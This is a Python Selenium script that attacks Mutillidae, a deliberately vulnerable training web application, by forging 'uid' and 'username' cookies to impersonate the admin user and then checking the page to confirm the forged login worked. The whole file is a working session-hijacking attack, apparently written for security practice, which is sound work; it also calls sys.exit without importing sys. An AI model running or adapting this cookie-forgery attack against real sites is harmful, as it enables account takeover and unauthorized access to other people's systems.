#!/usr/bin/env python

from selenium import webdriver
from bs4 import BeautifulSoup
import time
import optparse
import re

class BrokenAuthAndSessionMgmtAttack():
	users = {"1":"admin", "2":"adrian", "3":"john", "4":"jeremy", "5":"bryce", "6":"samurai", "7":"jim", "8":"bobby", "9":"simba"}
	uid = "1"

	def __init__(self, url):
		self.url = url		
		try:	
			useragent = "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
			profile = webdriver.FirefoxProfile()
			profile.set_preference("general.useragent.override",useragent)
			self.browser = webdriver.Firefox(profile)
		except Exception, e:
			print " [!] Browser object creation error:", e

	def __wait(self):
		time.sleep(2)

	def close(self):
		self.browser.close()
		
	def attack(self):
		if self.browser == None:
			return
		try:	
			print " [-] Openning '%s'\n"%self.url
			self.browser.get(self.url)
			self.__wait()

			_uid = BrokenAuthAndSessionMgmtAttack.uid
			_uname = BrokenAuthAndSessionMgmtAttack.users[_uid]
			self.browser.add_cookie({"name":"uid","value":_uid,"path":"/mutillidae/"})
			self.browser.add_cookie({"name":"username","value":_uname,"path":"/mutillidae/"})			

			print " [-] Openning '%s' again with cookie set\n"%self.url
			self.browser.get(self.url)
			self.__wait()

			page_src = self.browser.page_source
			
			soup = BeautifulSoup(page_src, "lxml")
			logged = soup.find("span", attrs={"id":"idSystemInformationHeading"}).get_text()

			if re.match("Logged In (User|Admin: %s.+)"%_uname, logged):
				print " [*] Attack was successful, you are logged in as '%s'"%_uname
			else:
				print " [*] Attack was not successfull, you are not logged in as '%s'"%_uname

		except Exception, e:
			print " [!] Attack was not successfull, error:", e
			
def main():
	parser = optparse.OptionParser("Usage: %prog -u <url> or %prog --url=<url>")
	parser.add_option("-u", "--url", dest="url", help="mutillidae home")
	options, args = parser.parse_args()
	if options.url == None:
		parser.print_help()
		sys.exit(0)
	
	attacker = BrokenAuthAndSessionMgmtAttack(options.url)
	attacker.attack()
	attacker.close()

if __name__ == "__main__":
	main()
